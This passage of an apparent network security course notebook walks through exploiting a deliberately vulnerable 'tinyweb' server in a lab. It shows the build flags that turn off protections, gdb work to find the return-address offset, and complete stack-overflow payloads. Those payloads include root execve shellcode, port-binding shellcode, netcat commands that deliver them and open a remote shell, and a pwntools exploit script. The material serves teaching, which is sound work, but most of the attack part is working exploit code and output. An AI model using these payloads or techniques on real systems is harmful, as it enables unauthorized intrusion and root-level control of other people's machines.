      "\t\t\t\tbyte = data_buffer[j];\r\n",
      "\t\t\t\tif((byte > 31) && (byte < 127)) // outside printable char range\r\n",
      "\t\t\t\t\tprintf(\"%c\", byte);\r\n",
      "\t\t\t\telse\r\n",
      "\t\t\t\t\tprintf(\".\");\r\n",
      "\t\t\t}\r\n",
      "\t\t\tprintf(\"\\n\"); // end of the dump line (each line 16 bytes)\r\n",
      "\t\t} // end if\r\n",
      "\t} // end for\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat ../util/utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "# disable ASLR\n",
      "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "# compiles .cpp to object file .o\n",
      "g++ -c -g -Wall -std=c++17 -m32 main.cpp\n",
      "# builds executable from object files\n",
      "g++ -m32 -fno-stack-protector -z execstack -no-pie -o tinyweb.exe *.o\n",
      "sudo chown root:root tinyweb.exe\n",
      "sudo chmod u+s tinyweb.exe\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 212\r\n",
      "drwxr-xr-x 3 kali kali  4096 Jul 20 14:12 .\r\n",
      "drwxr-xr-x 5 kali kali  4096 Jun 23 12:41 ..\r\n",
      "-rw-r--r-- 1 kali kali  1002 Jun 23 13:24 junk.txt\r\n",
      "-rw-r--r-- 1 kali kali   530 Jun 23 23:21 local_exploit.bin\r\n",
      "-rw-r--r-- 1 kali kali  5189 Jul 20 14:08 main.cpp\r\n",
      "-rw-r--r-- 1 root root 90600 Jul 20 14:12 main.o\r\n",
      "-rw-r--r-- 1 kali kali   864 Jun 23 13:08 Makefile\r\n",
      "-rw-r--r-- 1 kali kali   530 Jun 23 23:59 port_bind_exploit.bin\r\n",
      "-rwsr-xr-x 1 root root 84412 Jul 20 14:12 tinyweb.exe\r\n",
      "drwxr-xr-x 2 kali kali  4096 Jun 23 11:27 webroot\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run tinyweb.exe from a terminal\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ make run                                                                                           \n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "\n",
    "```\n",
    "\n",
    "### open a browser and browse to localhost\n",
    "- you'll see the following log on the Tinyweb server's console\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ make run                                                                                           \n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Got request from 127.0.0.1:51790 \"GET / HTTP/1.1\"\n",
    "        Opening './webroot/index.html'   200 OK\n",
    "Got request from 127.0.0.1:51792 \"GET /image.jpg HTTP/1.1\"\n",
    "        Opening './webroot/image.jpg'    200 OK\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tinyweb Stack Overflow Exploitation\n",
    "\n",
    "- crash the Tinyweb server\n",
    "- pawn the system\n",
    "- find the flaw\n",
    "\n",
    "## Crash Tinyweb server\n",
    "\n",
    "- use a different VM or a machine (attacker machine)\n",
    "- generate a junk data of 1000 bytes and send it to the server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python3 -c 'print(\"A\"*1000, end=\"\\r\\n\")' > junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|\r\n",
      "*\r\n",
      "000003e0  41 41 41 41 41 41 41 41  0d 0a                    |AAAAAAAA..|\r\n",
      "000003ea\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1002 junk.txt\r\n"
     ]
    }
   ],
   "source": [
    "# count the number of bytes\n",
    "! wc -c junk.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### send junk\n",
    "- replace tinyserver ip and port\n",
    "- send the junk from different VM or system\n",
    "\n",
    "#### attacker\n",
    "\n",
    "```bash\n",
    "$ cat junk.txt | nc -v [tinyseverip] [port]\n",
    "```\n",
    "\n",
    "#### target\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ make run\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "make: *** [Makefile:29: run] Segmentation fault\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Pawn the System running Tinyweb server\n",
    "\n",
    "- find the overlfow vulnerability\n",
    "- find the return address and offset from `request` buffer\n",
    "\n",
    "### Using GDB on a running process\n",
    "- run the tinyweb.exe and get its process id to attach it to the gdb\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ ps aux | grep tinyweb             \n",
    "root       12385  0.0  0.0   2452   520 pts/3    S+   13:33   0:00 ./tinyweb.exe\n",
    "kali       12398  0.0  0.0   6184   708 pts/4    S+   13:34   0:00 grep --color=auto tinyweb\n",
    "```\n",
    "\n",
    "- Attach gdb to the tinyweb server\n",
    "\n",
    "```\n",
    "$ sudo gdb -q --pid=[tinywebpid] --symbols=./tinyweb.exe\n",
    "```\n",
    "\n",
    "- use gdb to examine memory and addresses\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ sudo gdb -q --pid=12385 --symbols=./tinyweb.exe\n",
    "[sudo] password for kali: \n",
    "Reading symbols from ./tinyweb.exe...\n",
    "Attaching to process 12385\n",
    "Load new symbol table from \"/home/kali/projects/NetworkSecurity/demos/tinyweb/tinyweb.exe\"? (y or n) y\n",
    "Reading symbols from /home/kali/projects/NetworkSecurity/demos/tinyweb/tinyweb.exe...\n",
    "Reading symbols from /lib32/libc.so.6...\n",
    "(No debugging symbols found in /lib32/libc.so.6)\n",
    "Reading symbols from /lib/ld-linux.so.2...\n",
    "(No debugging symbols found in /lib/ld-linux.so.2)\n",
    "--Type <RET> for more, q to quit, c to continue without paging--c\n",
    "0xf7fd0559 in __kernel_vsyscall ()  \n",
    "\n",
    "(gdb) list main # list 10 lines around main\n",
    "20      void handle_connection(int, struct sockaddr_in *); // handle web requests\n",
    "21      int get_file_size(int); // returns the filesize of open file descriptor\n",
    "22      void send_file_not_found(const int); // send file not found error\n",
    "23      void send_file(const int, char *); // send file/resource requested\n",
    "24\n",
    "25      int main(void) {\n",
    "26         int sockfd, new_sockfd, yes=1; \n",
    "27         struct sockaddr_in host_addr, client_addr;   // my address information\n",
    "28         socklen_t sin_size;\n",
    "29\n",
    "(gdb)\n",
    "(gdb) list 75 # list 10 lines around line #75\n",
    "70              // receive one line from client and store it into request buffer\n",
    "71              length = recv_line(sockfd, request);\n",
    "72\n",
    "73              printf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\n",
    "74\n",
    "75              ptr = strstr(request, \" HTTP/\"); // search for valid looking request\n",
    "76              if(ptr == NULL) { // then this isn't valid HTTP\n",
    "77                      printf(\" NOT HTTP!\\n\");\n",
    "78              } \n",
    "79              else {                                                                     \n",
    "\n",
    "$ break 71 # break at recv_line function that has overrun issue\n",
    "\n",
    "$ continue # make a get request using a terminal or browser to hit the breakpoint\n",
    "$ print request\n",
    "$ print /x &request # Note the address of request variable\n",
    "$2 = (char (*)[500]) 0xffffc0e0\n",
    "(gdb) \n",
    "\n",
    "\n",
    "$ x/16wx request+500 # examine 16 words at request+500 bytes in stack - return address must be definitely 500 bytes away from request!\n",
    "(gdb) x/16wx request+500\n",
    "0xffffc2d4:     0xffffc304      0x00000003      0x5e2b4400      0x0804c000\n",
    "0xffffc2e4:     0xf7fab000      0xffffc338    **0x08049736**    0x00000004\n",
    "0xffffc2f4:     0xffffc304      0xffffc300      0x080495d9      0x00000010\n",
    "0xffffc304:     0x7cca0002      0x0100007f      0x00000000      0x00000000\n",
    "\n",
    "\n",
    "(gdb) bt # find the return address to main\n",
    "#0  handle_connection (sockfd=4, client_addr_ptr=0xffffc304) at main.cpp:71\n",
    "#1  0x08049736 in main () at main.cpp:55\n",
    "\n",
    "# return address to main is also stored at $ebp+4 \n",
    "(gdb) x/x $ebp+4 # prints the return address\n",
    "0xffffc2ec:     0x08049736\n",
    "\n",
    "# OFFSET to return address\n",
    "$ p /u <location of return address> - <request address> \n",
    "(gdb) p /u 0xffffc2ec-0xffffc0e0\n",
    "$5 = 524\n",
    "\n",
    "# find the address of about 100 bytes from the base of request (controlled return address)\n",
    "(gdb) p /x request+100\n",
    "$6 = 0xffffc144 \n",
    "\n",
    "```\n",
    "\n",
    "- exit the debugger and rerun the server on the same terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Local Shellcode Exploit\n",
    "- create a exploit code and send it to the server\n",
    "- use a different terminal on the same system\n",
    "- total length of string buffer = offset + 4 bytes\n",
    "\n",
    "```bash\n",
    "| NOP SLED \\x90 | exploit code | repeated controlled return addrees to NOP SLED |\n",
    "\n",
    "```\n",
    "- find the size of the exploit code\n",
    "- exploit codes can be found in `shellcode` subfolder of the NetworkExploitation folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/Fa21/NetworkSecurity'"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/NetworkSecurity\n"
     ]
    }
   ],
   "source": [
    "%cd ../../"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "35 shellcode/shellcode_root.bin\r\n"
     ]
    }
   ],
   "source": [
    "!wc -c shellcode/shellcode_root.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "293"
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# size of nop sled = total buffer - shellcode size - repeated return address\n",
    "(524+4)-35-(50*4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's generate the shellcode\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*293)' > local_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/Fa21/NetworkSecurity'"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the shellcode at the end of the exploit code\n",
    "! cat shellcode/shellcode_root.bin >> local_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "528 local_exploit.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c local_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the 50 repeated controlled return address: 0xffffc144\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x94\\xce\\xff\\xff\"*50)' >> local_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "# write the HTTP command delimeter end of request\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\r\\n\")' >> local_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "530 local_exploit.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c local_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "00000120  90 90 90 90 90 31 c0 31  db 31 c9 99 b0 a4 cd 80  |.....1.1.1......|\r\n",
      "00000130  6a 0b 58 51 68 2f 2f 73  68 68 2f 62 69 6e 89 e3  |j.XQh//shh/bin..|\r\n",
      "00000140  51 89 e2 53 89 e1 cd 80  94 ce ff ff 94 ce ff ff  |Q..S............|\r\n",
      "00000150  94 ce ff ff 94 ce ff ff  94 ce ff ff 94 ce ff ff  |................|\r\n",
      "*\r\n",
      "00000210  0d 0a                                             |..|\r\n",
      "00000212\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C local_exploit.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### send the exploit\n",
    "- restart the Tinyweb server\n",
    "- send the exploit code using netcat to the target from a terminal\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity]\n",
    "└─$ cat local_exploit.bin | nc -v 127.0.0.1 80                                                                1 ⨯\n",
    "localhost [127.0.0.1] 80 (http) open\n",
    "```\n",
    "- the server console should look like the following if successfully exploited\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ ./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Got request from 127.0.0.1:51954 \"�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��j\n",
    "    XQh//shh/bin��Q��S��D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���\"\n",
    " NOT HTTP!\n",
    "# whoami\n",
    "root\n",
    "# pwd\n",
    "/home/kali/projects/NetworkSecurity/demos/tinyweb                                  \n",
    "# uname                                                                             \n",
    "Linux\n",
    "# \n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote Exploit\n",
    "- local exploit is not practical in real-world\n",
    "- let's create a port binding shellcode so the attacker can remotely login to the victim once pwned\n",
    "- use a different VM or system as an attacker machine\n",
    "- create Port Binding Shellcode Exploit\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- write the binary shellcode to a file\n",
    "- add about 100 bytes to the beginning address of `request` buffer to get the working landing address\n",
    "\n",
    "### Generate port binding shellcode\n",
    "- make sure to provide IP of the target/victim system and available ports above 1024\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ gdb -q           \n",
    "gdb-peda$ shellcode generate\n",
    "Available shellcodes:                                                                          \n",
    "    x86/linux exec                                                                             \n",
    "    x86/linux bindport                                                                        \n",
    "    x86/linux connect                                                                         \n",
    "    x86/bsd exec                                                                              \n",
    "    x86/bsd bindport\n",
    "    x86/bsd connect\n",
    "\n",
    "# shellcode generate x86/linux bindport <port> <ip>\n",
    "- pick a port # that's unlikely in use by the Tinyweb server\n",
    "gdb-peda$ shellcode generate x86/linux bindport 9999 192.168.195.168\n",
    "# x86/linux/bindport: 84 bytes\n",
    "# port=9999, host=192.168.195.168\n",
    "shellcode = (\n",
    "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n",
    "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n",
    "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n",
    "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\"\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/NetworkSecurity\r\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "All done! Binary file created: port_bind_shellcode.bin\n"
     ]
    }
   ],
   "source": [
    "# FIXME: update your binary shellcode from PEDA...\n",
    "# x86/linux/bindport: 84 bytes\n",
    "# port=9999, host=192.168.195.167\n",
    "shellcode = (\n",
    "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n",
    "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n",
    "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n",
    "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\"\n",
    ").encode('latin-1')\n",
    "\n",
    "\n",
    "#FIXME: provide abs or relative path/file_name of the binary file to create\n",
    "fileName = \"port_bind_shellcode.bin\"\n",
    "\n",
    "# open and write binary to the file\n",
    "\n",
    "with open(fileName, 'wb') as fout:\n",
    "\tfout.write(shellcode)\n",
    "\n",
    "print(f'All done! Binary file created: {fileName}') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 db 53 43 53 6a 02 6a  66 58 99 89 e1 cd 80 96  |1.SCSj.jfX......|\r\n",
      "00000010  43 52 66 68 27 0f 66 53  89 e1 6a 66 58 50 51 56  |CRfh'.fS..jfXPQV|\r\n",
      "00000020  89 e1 cd 80 b0 66 d1 e3  cd 80 52 52 56 43 89 e1  |.....f....RRVC..|\r\n",
      "00000030  b0 66 cd 80 93 6a 02 59  b0 3f cd 80 49 79 f9 b0  |.f...j.Y.?..Iy..|\r\n",
      "00000040  0b 52 68 2f 2f 73 68 68  2f 62 69 6e 89 e3 52 53  |.Rh//shh/bin..RS|\r\n",
      "00000050  89 e1 cd 80                                       |....|\r\n",
      "00000054\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C port_bind_shellcode.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use Python script to create binary shellcode file\n",
    "\n",
    "- alternatively, a python script `shellcode_writer.py` to simplify generatinb binary shellcode file is provide in shellcode folder\n",
    "- can simply copy paste shellcode generated by PEDA and update the filename\n",
    "- the program when run will generated the binary file with shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "84 port_bind_shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c port_bind_shellcode.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "244"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# lets create the exploit code to send to the server\n",
    "# find the size of the NOP sled\n",
    "528-84-(50*4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*244)' > port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the shellcode\n",
    "! cat port_bind_shellcode.bin >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's write the repeated return address: 0xffffc144\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x94\\xce\\xff\\xff\"*50)' >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "528 port_bind_exploit.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the end of request delimeter \\r\\n\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\r\\n\")' >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "530 port_bind_exploit.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "000000f0  90 90 90 90 31 db 53 43  53 6a 02 6a 66 58 99 89  |....1.SCSj.jfX..|\r\n",
      "00000100  e1 cd 80 96 43 52 66 68  27 0f 66 53 89 e1 6a 66  |....CRfh'.fS..jf|\r\n",
      "00000110  58 50 51 56 89 e1 cd 80  b0 66 d1 e3 cd 80 52 52  |XPQV.....f....RR|\r\n",
      "00000120  56 43 89 e1 b0 66 cd 80  93 6a 02 59 b0 3f cd 80  |VC...f...j.Y.?..|\r\n",
      "00000130  49 79 f9 b0 0b 52 68 2f  2f 73 68 68 2f 62 69 6e  |Iy...Rh//shh/bin|\r\n",
      "00000140  89 e3 52 53 89 e1 cd 80  94 ce ff ff 94 ce ff ff  |..RS............|\r\n",
      "00000150  94 ce ff ff 94 ce ff ff  94 ce ff ff 94 ce ff ff  |................|\r\n",
      "*\r\n",
      "00000210  0d 0a                                             |..|\r\n",
      "00000212\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Expolit the Tinyweb Server\n",
    "- rerun the Tinyweb server on the target machine\n",
    "- send `port_bind_exploit.bin` from a different VM to the target machine\n",
    "    - this mimics real-world exploitation\n",
    "- use netcat as demostrated in the local exploit above\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity]\n",
    "└─$ cat port_bind_exploit.bin | nc -v <ip> 80 \n",
    "```\n",
    "\n",
    "- Tinyweb when exploited will run the port binding shellcode at port 9999 as shown below\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/tinyweb]\n",
    "└─$ ./tinyweb.exe                                                             139 ⨯\n",
    "Accepting web requests on port 80\n",
    "Got request from 192.168.195.161:37546 \"����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�SCSjjfX����CRfh�fS��jfXPQV���f��RRVC���f�jY�?Iy��\n",
    "                                                                                   Rh//shh/bin��RS��D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���D���\"\n",
    " NOT HTTP!\n",
    "\n",
    "```\n",
    "- use another terminal from the attcker machine to netcat to port 8080\n",
    "- once connected, you'll not see the prompt `$` `or `#`, but you can still issue commands on the pwned target\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/Fa21/NetworkSecurity/demos/tinyweb]\n",
    "└─$ nc -v 192.168.195.168 9999                                       1 ⚙\n",
    "192.168.195.168: inverse host lookup failed: Unknown host\n",
    "(UNKNOWN) [192.168.195.168] 9999 (?) open\n",
    "whoami\n",
    "user\n",
    "ls\n",
    "Makefile\n",
    "junk.txt\n",
    "local_exploit.bin\n",
    "main.cpp\n",
    "main.o\n",
    "port_bind_exploit.bin\n",
    "tinyweb.exe\n",
    "webroot\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit using Pwntools\n",
    "\n",
    "- Pwntools library helps us automate most of the steps using a Python script\n",
    "- let's use pwntools to exploit the remote tinyweb server\n",
    "- running pwntools interactively from Jupyter Notebook doesn't seem to work; connection autoshuts down\n",
    "- open `demos/tinyweb/exploit.py` file\n",
    "- fix all the FIXMEs and run it to exploit the target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to 192.168.195.166 on port 80\n",
      "[x] Opening connection to 192.168.195.166 on port 80: Trying 192.168.195.166\n",
      "[+] Opening connection to 192.168.195.166 on port 80: Done\n"
     ]
    }
   ],
   "source": [
    "# create a socket connection to target\n",
    "io = connect('192.168.195.166', 80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "# send some data..\n",
    "io.send(b'hello\\r\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/usr/bin/env python3\r\n",
      "\r\n",
      "from pwn import *\r\n",
      "\r\n",
      "# FIXME\r\n",
      "host = '192.168.195.168'\r\n",
      "\r\n",
      "# FIXME\r\n",
      "service_port = 80\r\n",
      "\r\n",
      "# FIXME - bind PORT\r\n",
      "bind_port = 9999\r\n",
      "\r\n",
      "# FIXME - add b\"....\" for each line of shellcode after copy pasting from PEDA\r\n",
      "# x86/linux/bindport: 84 bytes\r\n",
      "# port=9999, host=192.168.195.168\r\n",
      "shellcode = (\r\n",
      "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\r\n",
      "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\r\n",
      "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\r\n",
      "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\r\n",
      "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\r\n",
      "    \"\\x89\\xe1\\xcd\\x80\"\r\n",
      ").encode('latin-1')\r\n",
      "\r\n",
      "# size of nop sled = total buffer - shellcode size - repeated return address\r\n",
      "# (524+4)-35-(50*4)\r\n",
      "# FIXME\r\n",
      "controlled_address = p32(0xffffce94) # pack little endian\r\n",
      "\r\n",
      "# FIXME\r\n",
      "repeat_address = 50;\r\n",
      "\r\n",
      "repeated_return_address = controlled_address*repeat_address\r\n",
      "\r\n",
      "#FIXME\r\n",
      "total_exploit_len = 524+4 # offset + 4 bytes to overwrite return address\r\n",
      "\r\n",
      "sled_len = total_exploit_len - len(shellcode) - (repeat_address*4)\r\n",
      "print(f'sled len = {sled_len}')\r\n",
      "NOPSled = b\"\\x90\"*sled_len # asm('nop')\r\n",
      "eol = b'\\r\\n' # required for Web server to end request\r\n",
      "\r\n",
      "# create exploit code\r\n",
      "exploit_code = NOPSled + shellcode + repeated_return_address + eol\r\n",
      "print(f'sending exploit with len {len(exploit_code)}')\r\n",
      "\r\n",
      "io = connect(host, service_port)\r\n",
      "# send the exploit code to target\r\n",
      "io.send(exploit_code)\r\n",
      "\r\n",
      "# target exploited...\r\n",
